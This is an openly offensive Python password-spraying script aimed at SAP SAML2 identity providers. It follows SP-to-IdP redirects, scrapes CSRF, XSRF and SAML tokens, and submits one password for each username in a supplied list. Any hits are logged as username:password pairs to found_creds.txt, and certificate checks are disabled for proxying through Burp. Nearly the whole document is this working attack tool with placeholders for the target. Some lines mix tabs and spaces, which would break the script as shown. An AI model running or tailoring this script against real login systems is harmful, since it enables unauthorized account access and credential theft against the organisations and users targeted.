#SAML2 Passwordsprayer for SAP IDPs
#Creates a handler that follows the redirections from the SP to the IDP
#logs in with each user from the passwordlist (one per line) with the provided password
#uses python 3 syntax

#usage:python3 script.py /path/to/user-list Password
#i.e.: python3.7 script.py /project/maillist.txt Sommer2020
#Some characters in the password might need to be escaped with "\" so Sommer2020! becomes Sommer2020\!

#basic script taken from: https://stackoverflow.com/questions/16512965/logging-into-saml-shibboleth-authenticated-server-using-python

import urllib
import urllib.request
import urllib.parse
import sys
import ssl
import re
import http.cookiejar
from termcolor import colored

SP="https://MY_SERVICE_PROVIDER.com/saml/login"
IDP="https://MY_SAP_IDP.com" #most likely something like abc.ondemand.com 


if len (sys.argv) < 3:
        print("Usage: script.py <path_to_user_file> <Password>")
        sys.exit(0)
else:
        print(">>> Starting Attack <<<")

userfile = sys.argv[1]
password = sys.argv[2]

class ShibRedirectHandler (urllib.request.HTTPRedirectHandler):
    def http_error_302(self, req, fp, code, msg, headers):
        return urllib.request.HTTPRedirectHandler.http_error_302(self,req,fp,code,msg,headers)

# allow for untrusted SSL cert usage - e.g. for using with proxychains and burp
context=ssl._create_unverified_context()

xsrftokentemp = ""

print("Spraying Password: ",password)
with open(userfile) as mf:
        for line in mf:
            cookie = http.cookiejar.MozillaCookieJar()
            cookieprocessor = urllib.request.HTTPCookieProcessor(cookie)
            sslHandler = urllib.request.HTTPSHandler(context=context)
            opener = urllib.request.build_opener(sslHandler, ShibRedirectHandler, cookieprocessor)
            # set your headers here if needed for the SP - e.g. authorization headers and stuff
			opener.addheaders = [("Authorization", "Basic Tm9wZU5vdDpSZWFsbHlCdWRkeTop"),('User-agent', 'Mozilla/5.0'),('Customheader','Custom Value')]
            print("==> Following Redirections for SAML2 Auth to the IDP")
            resource = (opener.open(SP).read())
	    # decode response of the SP to UTF8 so we have a string in which we can search 
            decoded = resource.decode("utf-8")
	    # extract some stuff from the responses to form our URLs and POST data
            idpurltemp = re.search('action="[^"]*"',decoded)
            idpurl = idpurltemp.group(0)
            idpurl = idpurl.lstrip('action="')
            idpurl = idpurl.rstrip('"')
            samlrequesttemp = idpurl.lstrip('SAMLRequest=')
            samlrequesttemp = samlrequesttemp.split('&', 1)
            samlrequest = samlrequesttemp[0]
            signaturetemp = idpurl.split('&', 4)
            signaturetemp = signaturetemp[3]
            signature = signaturetemp.lstrip('Signature=')
            authtokentemp = re.search('csrf-token" content="[^"]*"',decoded)
            authtoken = authtokentemp.group(0)
            authtoken = authtoken.lstrip('csrf-token" content="')
            authtoken = authtoken.rstrip('"')
            for item in cookie:
               #print('cookie: ', item.name, item.value)
               if item.name == "XSRF_COOKIE":
                  xsrftokentemp=item.value
            #print(temp)
            xsrftoken = xsrftokentemp.lstrip('"')
            xsrftoken = xsrftoken.rstrip('"')
#Inspect the page source of the SAML2 login form; find the input names for the username
#and password, and maybe other arguments that get passed. Use burp or alike
            print("Trying: ",line.rstrip())
	    # change the hardcoded POST parameters to your needs
            loginData = urllib.parse.urlencode({'utf8':'%E2%9C%93','authenticity_token':authtoken,'xsrfProtection':xsrftoken,'method':'GET','idpSSOEndpoint':'https%3A%2F%2FYOURIDPEndpoint','SAMLReques':samlrequest,'RelayState':'http%3A%2F%2FYOURSPEndpoint','SigAlg':'http%3A%2F%2Fwww.w3.org%2F2001%2F04%2Fxmldsig-more%23rsa-sha256','Signature':signature,'j_username':line.rstrip(),'j_password':password})
            bLoginData = loginData.encode('ascii')
            response = opener.open(IDP + idpurl, bLoginData)

#Check if we get a SAMLResponse back or not. If so we´ve got a match.
            x=str(response.read())
            if "SAMLResponse" in x:
               string = "Houston we have a SAML Response for: "+line.rstrip()
               logtext = line.rstrip()+":"+password
               print(colored(string,"green"))
               log = open("found_creds.txt", "a+")
               log.write(logtext+"\n")
               log.close()
            else:
               string = "NOPE! No hit for: "+line.rstrip()+". More luck next time..."
               print(colored(string,"red"))
